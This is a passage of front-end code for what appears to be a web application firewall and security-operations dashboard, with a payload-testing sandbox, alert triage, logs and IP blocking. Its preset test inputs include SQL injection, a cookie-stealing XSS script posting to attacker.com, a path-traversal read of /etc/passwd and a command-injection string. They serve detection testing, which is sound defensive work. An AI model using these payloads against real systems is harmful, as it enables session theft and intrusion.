            <span class="px-2.5 py-1 rounded bg-secondary/15 text-secondary font-mono text-xs font-semibold">
              SAFE SANDBOX: Non-destructive
            </span>
          </div>

          <!-- Preset Attack Payloads Pills -->
          <div class="mt-4 flex flex-wrap items-center gap-2">
            <span class="text-xs font-mono text-outline uppercase font-semibold mr-1">Attack Presets:</span>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-primary font-mono text-xs" data-preset="sqli_union">SQLi: UNION SELECT</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-primary font-mono text-xs" data-preset="sqli_tautology">SQLi: OR 1=1</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-secondary font-mono text-xs" data-preset="xss_script">XSS: &lt;script&gt;</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-secondary font-mono text-xs" data-preset="xss_svg">XSS: SVG onload</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-tertiary font-mono text-xs" data-preset="lfi">LFI: ../etc/passwd</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-error font-mono text-xs" data-preset="cmdi">CmdI: ; whoami</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-outline font-mono text-xs" data-preset="scanner">Scanner: sqlmap</button>
            <button class="preset-btn px-2.5 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-secondary font-mono text-xs" data-preset="clean">Benign: Clean Query</button>
          </div>

          <!-- Input Console -->
          <div class="mt-4 space-y-3">
            <div class="grid grid-cols-1 md:grid-cols-4 gap-3">
              <div>
                <label class="block text-[11px] font-mono text-outline uppercase mb-1">HTTP Method</label>
                <select id="test-method" class="w-full bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none">
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                </select>
              </div>
              <div class="md:col-span-2">
                <label class="block text-[11px] font-mono text-outline uppercase mb-1">Target Endpoint</label>
                <input id="test-path" class="w-full bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" value="/api/v1/orders?id="/>
              </div>
              <div>
                <label class="block text-[11px] font-mono text-outline uppercase mb-1">Simulated Client IP</label>
                <input id="test-ip" class="w-full bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" value="194.135.24.8"/>
              </div>
            </div>

            <div>
              <label class="block text-[11px] font-mono text-outline uppercase mb-1">Payload or Query String to Inspect</label>
              <textarea id="test-payload" rows="3" class="w-full bg-surface-container-lowest text-on-surface font-mono text-xs p-3 rounded border border-surface-container-high/40 focus:outline-none focus:ring-1 focus:ring-primary" placeholder="Type or paste payload string (e.g. 1' UNION SELECT 1,username,password FROM users--)">1' UNION SELECT 1,username,password FROM users--</textarea>
            </div>

            <div class="flex items-center justify-between pt-1">
              <span class="text-xs font-mono text-outline">POST /api/detection/inspect</span>
              <button id="run-inspect-btn" class="px-5 py-2 rounded-lg bg-primary-container text-on-primary-container font-mono text-xs font-bold hover:brightness-110 flex items-center gap-2 shadow-[0_0_12px_rgba(77,142,255,0.4)]">
                <span class="material-symbols-outlined text-[18px]">play_arrow</span>
                <span>Analyze Request</span>
              </button>
            </div>
          </div>

          <!-- Live Result Container -->
          <div id="inspection-result-box" class="mt-5 pt-4 border-t border-surface-container-high/40 hidden">
            <!-- Rendered after execution -->
          </div>
        </div>

        <!-- Live Ingress Attack Queue from DB -->
        <div class="rounded-xl bg-surface-container-low border border-surface-container-high/40 p-5 shadow-sm">
          <div class="flex items-center justify-between pb-3 border-b border-surface-container-high/30">
            <div class="flex items-center gap-2">
              <span class="material-symbols-outlined text-error text-[20px]">shield</span>
              <h3 class="font-bold text-sm text-on-surface">Live Attack Queue Telemetry</h3>
            </div>
            <span class="font-mono text-xs text-secondary">REAL-TIME DB FEED</span>
          </div>

          <div class="space-y-3 mt-4" id="attack-queue-feed">
            <div class="text-center py-6 text-outline font-mono text-xs">Loading attack queue...</div>
          </div>
        </div>
      </div>
    `;

    // Presets
    const presets = {
      sqli_union: {
        method: 'GET',
        path: '/api/v2/products?category=',
        ip: '194.135.24.8',
        payload: "electronics' UNION SELECT 1,username,password FROM users--"
      },
      sqli_tautology: {
        method: 'POST',
        path: '/auth/login',
        ip: '185.220.101.44',
        payload: "admin' OR '1'='1"
      },
      xss_script: {
        method: 'POST',
        path: '/api/v1/comments',
        ip: '185.191.171.12',
        payload: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
      },
      xss_svg: {
        method: 'POST',
        path: '/profile/update',
        ip: '185.191.171.12',
        payload: "<svg/onload=alert('XSS_TRIGGERED')>"
      },
      lfi: {
        method: 'GET',
        path: '/download?file=',
        ip: '185.220.101.44',
        payload: "../../../../etc/passwd"
      },
      cmdi: {
        method: 'POST',
        path: '/admin/diagnostic/ping',
        ip: '198.51.100.25',
        payload: "127.0.0.1; whoami"
      },
      scanner: {
        method: 'GET',
        path: '/wp-login.php',
        ip: '194.135.24.8',
        payload: "User-Agent: sqlmap/1.6.12#stable"
      },
      clean: {
        method: 'GET',
        path: '/search?q=',
        ip: '66.249.79.132',
        payload: "best enterprise web application firewall"
      }
    };

    document.querySelectorAll('.preset-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const key = btn.getAttribute('data-preset');
        if (presets[key]) {
          document.getElementById('test-method').value = presets[key].method;
          document.getElementById('test-path').value = presets[key].path;
          document.getElementById('test-ip').value = presets[key].ip;
          document.getElementById('test-payload').value = presets[key].payload;
        }
      });
    });

    // Run Inspect Button
    const runBtn = document.getElementById('run-inspect-btn');
    if (runBtn) {
      runBtn.addEventListener('click', async () => {
        const method = document.getElementById('test-method').value;
        const path = document.getElementById('test-path').value;
        const ip = document.getElementById('test-ip').value;
        const payload = document.getElementById('test-payload').value;
        const resultBox = document.getElementById('inspection-result-box');

        runBtn.disabled = true;
        runBtn.innerHTML = `<span class="material-symbols-outlined text-[18px] animate-spin">refresh</span><span>Inspecting...</span>`;

        try {
          const res = await window.SentinelAPI.inspectPayload({
            payload: payload,
            source_ip: ip,
            http_method: method,
            path: path
          });

          resultBox.classList.remove('hidden');
          const isAttack = res.is_attack;
          const badgeClass = res.verdict === 'BLOCKED' ? 'bg-error text-on-error' : res.verdict === 'FLAGGED' ? 'bg-error-container text-on-error-container' : 'bg-secondary/20 text-secondary';

          resultBox.innerHTML = `
            <div class="p-4 rounded-xl ${isAttack ? 'bg-error-container/10 border border-error/30' : 'bg-secondary/10 border border-secondary/30'} space-y-3 font-mono text-xs">
              <div class="flex items-center justify-between">
                <div class="flex items-center gap-2">
                  <span class="px-2.5 py-0.5 rounded uppercase font-bold text-xs ${badgeClass}">
                    VERDICT: ${res.verdict}
                  </span>
                  <span class="text-on-surface font-bold text-sm">${res.attack_category}</span>
                </div>
                <div class="text-outline text-right">
                  <span>Confidence: <b>${(res.confidence * 100).toFixed(0)}%</b></span> •
                  <span>Latency: <b>${res.execution_time_ms} ms</b></span>
                </div>
              </div>

              <div class="bg-surface-container-lowest p-3 rounded border border-surface-container-high/30 space-y-1">
                <div class="text-outline uppercase text-[10px]">Rule Triggered</div>
                <div class="text-primary font-bold">${res.matched_rule}</div>
                <div class="text-on-surface-variant pt-1">${res.explanation}</div>
              </div>

              <div class="bg-surface-container-lowest p-3 rounded border border-surface-container-high/30 space-y-1">
                <div class="text-secondary uppercase text-[10px] font-bold">Recommended SOC Action</div>
                <div class="text-on-surface">${res.recommended_action}</div>
              </div>
            </div>
          `;

          showToast(`Inspection Complete: ${res.verdict} (${res.attack_category})`, isAttack ? 'error' : 'success');
          loadAttackQueue(); // Refresh the queue below
        } catch (err) {
          console.error(err);
          showToast('Failed to inspect payload. Backend error.', 'error');
        } finally {
          runBtn.disabled = false;
          runBtn.innerHTML = `<span class="material-symbols-outlined text-[18px]">play_arrow</span><span>Analyze Request</span>`;
        }
      });
    }

    async function loadAttackQueue() {
      try {
        const events = await window.SentinelAPI.getSecurityEvents({ limit: 5 });
        const queueFeed = document.getElementById('attack-queue-feed');
        if (!queueFeed) return;

        if (events.length === 0) {
          queueFeed.innerHTML = `<div class="text-center py-6 text-outline font-mono text-xs">No active attack alerts in queue.</div>`;
          return;
        }

        queueFeed.innerHTML = events.map(e => `
          <div class="p-3.5 rounded-lg bg-surface-container border border-surface-container-high/40 flex flex-col gap-2 font-mono text-xs">
            <div class="flex items-center justify-between">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded font-bold text-[10px] ${e.severity === 'CRITICAL' ? 'bg-error text-on-error' : 'bg-error-container text-on-error-container'}">${e.severity}</span>
                <span class="text-on-surface font-bold">${e.attack_category}</span>
                <span class="text-outline">• ${e.matched_rule_id}</span>
              </div>
              <span class="text-outline">${new Date(e.timestamp).toLocaleTimeString()}</span>
            </div>
            <div class="bg-surface-container-lowest p-2 rounded text-outline font-mono truncate">
              <span class="text-secondary font-bold">${e.http_method}</span> ${e.payload_snippet || e.request_path}
            </div>
            <div class="flex items-center justify-between text-outline text-[11px]">
              <span>Source IP: <b class="text-primary">${e.source_ip}</b></span>
              <span class="text-secondary font-bold">${e.action_taken}</span>
            </div>
          </div>
        `).join('');
      } catch (err) {
        console.error(err);
      }
    }

    loadAttackQueue();
  }

  // =========================================================================
  // VIEW 4: SECURITY ALERTS & INCIDENT RESPONSE
  // =========================================================================
  async function renderSecurityAlerts(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <!-- Triage Controls Toolbar -->
        <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 shadow-sm flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Status Filter Tabs -->
          <div class="flex items-center gap-1.5 overflow-x-auto pb-1 lg:pb-0" id="alert-status-tabs">
            <button class="px-3.5 py-1.5 rounded-lg bg-primary-container text-on-primary-container font-mono text-xs font-bold" data-status="ALL">All Alerts</button>
            <button class="px-3.5 py-1.5 rounded-lg text-outline hover:text-on-surface font-mono text-xs" data-status="NEW">New</button>
            <button class="px-3.5 py-1.5 rounded-lg text-outline hover:text-on-surface font-mono text-xs" data-status="INVESTIGATING">Investigating</button>
            <button class="px-3.5 py-1.5 rounded-lg text-outline hover:text-on-surface font-mono text-xs" data-status="RESOLVED">Resolved</button>
            <button class="px-3.5 py-1.5 rounded-lg text-outline hover:text-on-surface font-mono text-xs" data-status="FALSE_POSITIVE">False Positive</button>
          </div>

          <div class="flex items-center gap-3">
            <select id="alert-severity-select" class="bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-1.5 rounded border border-surface-container-high/40 focus:outline-none">
              <option value="ALL">Severity: All</option>
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
            </select>
            <button onclick="renderSecurityAlerts(document.getElementById('views-container'))" class="px-3 py-1.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-on-surface font-mono text-xs flex items-center gap-1">
              <span class="material-symbols-outlined text-[16px] text-secondary">refresh</span>
              <span>Sync</span>
            </button>
          </div>
        </div>

        <!-- Alerts Queue Cards -->
        <div class="space-y-4" id="alerts-list-container">
          <div class="text-center py-10 text-outline font-mono text-xs">Loading security alerts...</div>
        </div>
      </div>
    `;

    let activeStatus = 'ALL';

    async function loadAlerts() {
      const severity = document.getElementById('alert-severity-select')?.value || 'ALL';
      try {
        const alerts = await window.SentinelAPI.getAlerts({
          status: activeStatus,
          severity: severity
        });
        cachedAlerts = alerts;

        const listContainer = document.getElementById('alerts-list-container');
        if (!listContainer) return;

        if (alerts.length === 0) {
          listContainer.innerHTML = `<div class="p-8 text-center bg-surface-container-low rounded-xl border border-surface-container-high/40 text-outline font-mono text-xs">No alerts matching filter criteria.</div>`;
          return;
        }

        listContainer.innerHTML = alerts.map(a => {
          let notes = [];
          try { notes = JSON.parse(a.notes_json || '[]'); } catch (e) {}

          const sevBadge = a.severity === 'CRITICAL' ? 'bg-error text-on-error font-bold animate-pulse' : a.severity === 'HIGH' ? 'bg-error-container text-on-error-container' : 'bg-surface-container-highest text-secondary';
          const statusBadge = a.status === 'NEW' ? 'bg-error/15 text-error' : a.status === 'INVESTIGATING' ? 'bg-secondary/15 text-secondary' : 'bg-surface-container text-outline';

          return `
            <div class="bg-surface-container-low rounded-xl p-5 border border-surface-container-high/40 shadow-md relative overflow-hidden flex flex-col gap-3">
              <div class="absolute left-0 top-0 bottom-0 w-1 ${a.severity === 'CRITICAL' ? 'bg-error' : 'bg-secondary'}"></div>

              <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-container-high/20 pb-3">
                <div class="flex items-center gap-2">
                  <span class="px-2 py-0.5 rounded text-[10px] font-mono ${sevBadge}">${a.severity}</span>
                  <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold ${statusBadge}">${a.status}</span>
                  <span class="font-mono text-xs font-semibold text-primary">#${a.alert_code}</span>
                  <span class="text-outline text-xs">• ${new Date(a.timestamp).toLocaleString()}</span>
                </div>
                <span class="font-mono text-xs text-on-surface bg-surface-container-high px-2 py-0.5 rounded">
                  Assignee: ${a.assignee || 'Unassigned'}
                </span>
              </div>

              <div>
                <h3 class="text-base font-bold text-on-surface">${a.title}</h3>
                <p class="text-xs text-on-surface-variant mt-1 leading-relaxed">${a.description}</p>
              </div>

              <div class="bg-surface-container-lowest p-3 rounded font-mono text-xs space-y-1.5 border border-surface-container-high/20">
                <div class="flex items-center justify-between text-outline text-[11px]">
                  <span>Target: <b class="text-on-surface">${a.target_endpoint}</b></span>
                  <span>Origin: <b class="text-primary">${a.source_ip}</b> (${a.unique_ip_count} IPs)</span>
                  <span>Velocity: <b class="text-error">${a.velocity_rps} req/s</b></span>
                </div>
                ${notes.length > 0 ? `
                  <div class="pt-2 border-t border-surface-container-high/30 space-y-1">
                    <span class="text-[10px] text-secondary font-bold uppercase">Analyst Triage Log:</span>
                    ${notes.map(n => `<div class="text-[11px] text-outline"><span class="text-primary font-semibold">${n.author}:</span> ${n.content}</div>`).join('')}
                  </div>
                ` : ''}
              </div>

              <!-- Action Buttons -->
              <div class="flex flex-wrap items-center justify-between gap-2 pt-2">
                <div class="flex items-center gap-2">
                  <button onclick="handleAlertStatus(${a.id}, 'RESOLVED')" class="px-3 py-1.5 rounded-lg bg-primary text-on-primary font-mono text-xs font-bold hover:brightness-110 flex items-center gap-1">
                    <span class="material-symbols-outlined text-[15px]">verified</span>
                    <span>Resolve</span>
                  </button>
                  <button onclick="handleAlertStatus(${a.id}, 'INVESTIGATING', 'Alex Reyes (Lead SOC)')" class="px-3 py-1.5 rounded-lg bg-surface-container-high hover:bg-surface-container-highest text-secondary font-mono text-xs font-bold flex items-center gap-1">
                    <span class="material-symbols-outlined text-[15px]">arrow_upward</span>
                    <span>Take Incident</span>
                  </button>
                  <button onclick="handleAlertStatus(${a.id}, 'FALSE_POSITIVE')" class="px-3 py-1.5 rounded-lg bg-surface-container-high hover:bg-surface-container-highest text-outline hover:text-on-surface font-mono text-xs flex items-center gap-1">
                    <span class="material-symbols-outlined text-[15px]">flag</span>
                    <span>False Positive</span>
                  </button>
                </div>
                <button onclick="handleAddNotePrompt(${a.id})" class="px-3 py-1.5 rounded-lg bg-surface-container-high text-primary font-mono text-xs hover:bg-surface-container-highest flex items-center gap-1">
                  <span class="material-symbols-outlined text-[15px]">edit_note</span>
                  <span>Add Note</span>
                </button>
              </div>
            </div>
          `;
        }).join('');
      } catch (err) {
        console.error(err);
      }
    }

    // Status Tab handlers
    document.querySelectorAll('#alert-status-tabs button').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('#alert-status-tabs button').forEach(b => {
          b.className = 'px-3.5 py-1.5 rounded-lg text-outline hover:text-on-surface font-mono text-xs';
        });
        btn.className = 'px-3.5 py-1.5 rounded-lg bg-primary-container text-on-primary-container font-mono text-xs font-bold';
        activeStatus = btn.getAttribute('data-status');
        loadAlerts();
      });
    });

    document.getElementById('alert-severity-select')?.addEventListener('change', loadAlerts);
    loadAlerts();
  }

  // =========================================================================
  // VIEW 5: SECURITY AUDIT LOGS
  // =========================================================================
  async function renderSecurityLogs(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <div class="flex items-center justify-between bg-surface-container-low p-4 rounded-xl border border-surface-container-high/40 shadow-sm">
          <div class="flex items-center gap-3">
            <span class="material-symbols-outlined text-[24px] text-primary">receipt_long</span>
            <div>
              <h2 class="text-base font-bold text-on-surface">Security Audit Logs &amp; Forensics</h2>
              <p class="font-mono text-xs text-outline">Search and export tamper-evident inspection event logs</p>
            </div>
          </div>
          <div class="flex items-center gap-2">
            <a href="http://127.0.0.1:8000/api/reports/export?format=csv" target="_blank" class="px-3 py-1.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-secondary font-mono text-xs flex items-center gap-1.5">
              <span class="material-symbols-outlined text-[16px]">file_download</span>
              <span>Export CSV</span>
            </a>
            <a href="http://127.0.0.1:8000/api/reports/export?format=json" target="_blank" class="px-3 py-1.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-primary font-mono text-xs flex items-center gap-1.5">
              <span class="material-symbols-outlined text-[16px]">code</span>
              <span>Export JSON</span>
            </a>
          </div>
        </div>

        <div class="rounded-xl bg-surface-container-low border border-surface-container-high/40 overflow-hidden shadow-xl">
          <div class="overflow-x-auto">
            <table class="w-full text-left font-mono text-xs">
              <thead class="bg-surface-container-lowest text-outline uppercase text-[10px] tracking-wider select-none">
                <tr>
                  <th class="py-2.5 px-4">Timestamp</th>
                  <th class="py-2.5 px-4">Client IP</th>
                  <th class="py-2.5 px-4">Method / Endpoint</th>
                  <th class="py-2.5 px-4">Attack Vector</th>
                  <th class="py-2.5 px-4">Severity</th>
                  <th class="py-2.5 px-4">Matched Rule</th>
                  <th class="py-2.5 px-4 text-center">Action</th>
                </tr>
              </thead>
              <tbody id="logs-table-body" class="divide-y divide-surface-container-high/20">
                <tr><td colspan="7" class="text-center py-8 text-outline">Loading audit logs...</td></tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    `;

    try {
      const logs = await window.SentinelAPI.getLogs({ limit: 50 });
      const tbody = document.getElementById('logs-table-body');
      if (!tbody) return;

      if (logs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" class="text-center py-8 text-outline">No log records recorded yet.</td></tr>`;
        return;
      }

      tbody.innerHTML = logs.map(l => `
        <tr class="hover:bg-surface-container-high/40 transition-colors">
          <td class="py-2 px-4 whitespace-nowrap text-outline">${new Date(l.timestamp).toLocaleString()}</td>
          <td class="py-2 px-4 whitespace-nowrap text-primary font-semibold">${l.source_ip}</td>
          <td class="py-2 px-4 whitespace-nowrap">
            <span class="text-secondary font-bold">${l.http_method}</span> ${l.request_path || '/'}
          </td>
          <td class="py-2 px-4 whitespace-nowrap text-error font-semibold">${l.attack_category}</td>
          <td class="py-2 px-4 whitespace-nowrap">
            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${l.severity === 'CRITICAL' ? 'bg-error text-on-error' : 'bg-surface-container-high text-secondary'}">${l.severity}</span>
          </td>
          <td class="py-2 px-4 whitespace-nowrap text-outline">${l.matched_rule_id}</td>
          <td class="py-2 px-4 text-center whitespace-nowrap">
            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${l.action_taken === 'BLOCKED' ? 'bg-error/20 text-error' : 'bg-surface-container text-secondary'}">${l.action_taken}</span>
          </td>
        </tr>
      `).join('');
    } catch (err) {
      console.error(err);
    }
  }

  // =========================================================================
  // VIEW 6: IP REPUTATION & BLOCKING
  // =========================================================================
  async function renderIPReputation(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <!-- Header & Quick Block Box -->
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div class="lg:col-span-2 bg-surface-container-low p-5 rounded-xl border border-surface-container-high/40 shadow-sm">
            <div class="flex items-center gap-3 mb-2">
              <span class="material-symbols-outlined text-secondary text-[24px]">gavel</span>
              <h2 class="text-base font-bold text-on-surface">IP Reputation &amp; Edge Drop Management</h2>
            </div>
            <p class="font-mono text-xs text-outline mb-4">
              Enforce immediate drop verdicts on hostile CIDRs, Tor exit nodes, and botnet IPs.
            </p>
            <div class="flex flex-col sm:flex-row items-center gap-2">
              <input id="block-ip-input" class="flex-1 w-full bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" placeholder="Enter IPv4 or IPv6 (e.g. 198.51.100.99)"/>
              <input id="block-reason-input" class="flex-1 w-full bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" placeholder="Reason (e.g. SQLi probe activity)"/>
              <button id="submit-block-btn" class="w-full sm:w-auto px-4 py-2 rounded bg-error text-on-error font-mono text-xs font-bold hover:brightness-110 flex items-center gap-1.5 shrink-0">
                <span class="material-symbols-outlined text-[16px]">block</span>
                <span>Deploy Block</span>
              </button>
            </div>
          </div>

          <div class="bg-surface-container-low p-5 rounded-xl border border-surface-container-high/40 shadow-sm flex flex-col justify-between">
            <span class="font-mono text-xs text-outline uppercase">Threat Intelligence Feeds</span>
            <div class="space-y-2 my-2 font-mono text-xs">
              <div class="flex justify-between"><span class="text-outline">Tor Exit Synced:</span><span class="text-secondary font-bold">1,842 nodes</span></div>
              <div class="flex justify-between"><span class="text-outline">Malicious ASNs:</span><span class="text-error font-bold">14 ASNs</span></div>
              <div class="flex justify-between"><span class="text-outline">Firewall Mode:</span><span class="text-primary font-bold">Active Inline Drop</span></div>
            </div>
            <span class="text-[10px] font-mono text-secondary">Local SQLite Edge Table</span>
          </div>
        </div>

        <!-- IP List Table -->
        <div class="rounded-xl bg-surface-container-low border border-surface-container-high/40 overflow-hidden shadow-xl">
          <div class="overflow-x-auto">
            <table class="w-full text-left font-mono text-xs">
              <thead class="bg-surface-container-lowest text-outline uppercase text-[10px] tracking-wider select-none">
                <tr>
                  <th class="py-2.5 px-4">Client IP Address</th>
                  <th class="py-2.5 px-4">Classification</th>
                  <th class="py-2.5 px-4">Country &amp; Network</th>
                  <th class="py-2.5 px-4 text-center">Threat Score</th>
                  <th class="py-2.5 px-4 text-center">Total Blocks</th>
                  <th class="py-2.5 px-4 text-center">Firewall Status</th>
                  <th class="py-2.5 px-4 text-center">Action</th>
                </tr>
              </thead>
              <tbody id="ip-table-body" class="divide-y divide-surface-container-high/20">
                <tr><td colspan="7" class="text-center py-8 text-outline">Loading IP reputations...</td></tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    `;

    async function loadIPs() {
      try {
        const ips = await window.SentinelAPI.getIPs();
        const tbody = document.getElementById('ip-table-body');
        if (!tbody) return;

        tbody.innerHTML = ips.map(ip => `
          <tr class="hover:bg-surface-container-high/40 transition-colors">
            <td class="py-2.5 px-4 font-bold text-primary">${ip.ip_address}</td>
            <td class="py-2.5 px-4">
              <span class="px-2 py-0.5 rounded text-[10px] font-bold ${ip.classification.includes('TOR') ? 'bg-error-container text-on-error-container' : 'bg-surface-container-high text-secondary'}">${ip.classification}</span>
            </td>
            <td class="py-2.5 px-4 text-outline">${ip.country} • ${ip.asn}</td>
            <td class="py-2.5 px-4 text-center font-bold ${ip.reputation_score > 80 ? 'text-error' : 'text-secondary'}">${ip.reputation_score}/100</td>
            <td class="py-2.5 px-4 text-center text-outline">${ip.total_blocks}</td>
            <td class="py-2.5 px-4 text-center">
              <span class="px-2 py-0.5 rounded text-[10px] font-bold ${ip.is_blocked ? 'bg-error text-on-error' : 'bg-surface-container-high text-secondary'}">
                ${ip.is_blocked ? 'BLOCKED' : 'MONITORED'}
              </span>
            </td>
            <td class="py-2.5 px-4 text-center">
              ${ip.is_blocked ? `
                <button onclick="handleUnblockIP('${ip.ip_address}')" class="px-2.5 py-1 rounded bg-surface-container-highest text-secondary hover:text-on-surface text-[10px] font-bold">
                  Unblock
                </button>
              ` : `
                <button onclick="handleQuickBlock('${ip.ip_address}')" class="px-2.5 py-1 rounded bg-error-container text-on-error-container text-[10px] font-bold">
                  Block
                </button>
              `}
            </td>
          </tr>
        `).join('');
      } catch (err) {
        console.error(err);
      }
    }

    document.getElementById('submit-block-btn')?.addEventListener('click', async () => {
      const ip = document.getElementById('block-ip-input')?.value.trim();
      const reason = document.getElementById('block-reason-input')?.value.trim() || 'Manual SOC Block';
      if (!ip) {
        showToast('Please enter a valid IP address.', 'error');
        return;
      }
      try {
        await window.SentinelAPI.blockIP(ip, reason);
        showToast(`IP ${ip} blocked successfully on edge firewall.`, 'success');
        document.getElementById('block-ip-input').value = '';
        loadIPs();
      } catch (err) {
        showToast('Error deploying IP block.', 'error');
      }
    });

    loadIPs();
  }

  // =========================================================================
  // VIEW 7: RATE LIMITING POLICY
  // =========================================================================
  async function renderRateLimiting(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6 max-w-4xl">
        <div class="bg-surface-container-low p-6 rounded-xl border border-surface-container-high/40 shadow-sm space-y-5">
          <div class="flex items-center gap-3 pb-3 border-b border-surface-container-high/40">
            <span class="material-symbols-outlined text-secondary text-[24px]">speed</span>
            <div>
              <h2 class="text-base font-bold text-on-surface">Sliding Window Rate Limiting Configuration</h2>
              <p class="font-mono text-xs text-outline">Manage perimeter request thresholds, burst budgets, and HTTP 429 penalties</p>
            </div>
          </div>

          <div class="space-y-4 font-mono text-xs">
            <div>
              <label class="block text-outline uppercase text-[11px] mb-1">Requests Allowed Per Minute (Per Client IP)</label>
              <div class="flex items-center gap-4">
                <input id="rl-rpm" type="number" min="5" max="1000" class="w-32 bg-surface-container-lowest text-on-surface font-mono text-sm px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" value="120"/>
                <span class="text-outline text-xs">Default: 120 req/min (Lower to e.g. 10 to test 429 responses easily)</span>
              </div>
            </div>

            <div>
              <label class="block text-outline uppercase text-[11px] mb-1">Burst Tolerance Budget</label>
              <input id="rl-burst" type="number" min="1" max="100" class="w-32 bg-surface-container-lowest text-on-surface font-mono text-sm px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" value="30"/>
            </div>

            <div>
              <label class="block text-outline uppercase text-[11px] mb-1">Sliding Time Window (Seconds)</label>
              <input id="rl-window" type="number" min="10" max="300" class="w-32 bg-surface-container-lowest text-on-surface font-mono text-sm px-3 py-2 rounded border border-surface-container-high/40 focus:outline-none" value="60"/>
            </div>

            <div class="flex items-center gap-3 pt-2">
              <input id="rl-demo" type="checkbox" checked class="w-4 h-4 rounded text-primary focus:ring-0"/>
              <label for="rl-demo" class="text-on-surface cursor-pointer">
                <b>Enable Demonstration Mode:</b> Logs all threshold breaches with full diagnostics and telemetry
              </label>
            </div>

            <div class="pt-4 border-t border-surface-container-high/30 flex items-center justify-between">
              <span class="text-outline text-[11px]" id="rl-tracked-count">Tracked IPs: Loading...</span>
              <button id="save-rl-btn" class="px-5 py-2 rounded-lg bg-primary text-on-primary font-mono text-xs font-bold hover:brightness-110 shadow-md">
                Save Rate Limiting Policy
              </button>
            </div>
          </div>
        </div>
      </div>
    `;

    try {
      const cfg = await window.SentinelAPI.getRateLimits();
      document.getElementById('rl-rpm').value = cfg.requests_per_minute;
      document.getElementById('rl-burst').value = cfg.burst_limit;
      document.getElementById('rl-window').value = cfg.window_seconds;
      document.getElementById('rl-demo').checked = cfg.demo_mode;
      document.getElementById('rl-tracked-count').textContent = `Currently Tracked Client IPs: ${cfg.current_tracked_ips}`;

      document.getElementById('save-rl-btn')?.addEventListener('click', async () => {
        const rpm = parseInt(document.getElementById('rl-rpm').value, 10);
        const burst = parseInt(document.getElementById('rl-burst').value, 10);
        const windowSec = parseInt(document.getElementById('rl-window').value, 10);
        const demo = document.getElementById('rl-demo').checked;

        try {
          await window.SentinelAPI.updateRateLimits({
            requests_per_minute: rpm,
            burst_limit: burst,
            window_seconds: windowSec,
            is_active: true,
            demo_mode: demo
          });
          showToast('Rate Limiting policy updated successfully.', 'success');
        } catch (err) {
          showToast('Failed to update rate limit policy.', 'error');
        }
      });
    } catch (err) {
      console.error(err);
    }
  }

  // =========================================================================
  // VIEW 8: WAF RULES MANAGEMENT
  // =========================================================================
  async function renderWAFRules(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <div class="bg-surface-container-low p-4 rounded-xl border border-surface-container-high/40 shadow-sm flex items-center justify-between">
          <div class="flex items-center gap-3">
            <span class="material-symbols-outlined text-primary text-[24px]">rule</span>
            <div>
              <h2 class="text-base font-bold text-on-surface">WAF Signature Ruleset Engine</h2>
              <p class="font-mono text-xs text-outline">Manage active regex inspection rules and default mitigation actions</p>
            </div>
          </div>
          <span class="px-2.5 py-1 rounded bg-secondary/15 text-secondary font-mono text-xs font-bold" id="rules-count-badge">
            Rules Loaded
          </span>
        </div>

        <div class="rounded-xl bg-surface-container-low border border-surface-container-high/40 overflow-hidden shadow-xl">
          <div class="overflow-x-auto">
            <table class="w-full text-left font-mono text-xs">
              <thead class="bg-surface-container-lowest text-outline uppercase text-[10px] tracking-wider select-none">
                <tr>
                  <th class="py-2.5 px-4 w-32">Rule ID</th>
                  <th class="py-2.5 px-4">Rule Name</th>
                  <th class="py-2.5 px-4">Category</th>
                  <th class="py-2.5 px-4">Severity</th>
                  <th class="py-2.5 px-4">Pattern Signature</th>
                  <th class="py-2.5 px-4 text-center">Status</th>
                  <th class="py-2.5 px-4 text-center">Toggle</th>
                </tr>
              </thead>
              <tbody id="waf-rules-table-body" class="divide-y divide-surface-container-high/20">
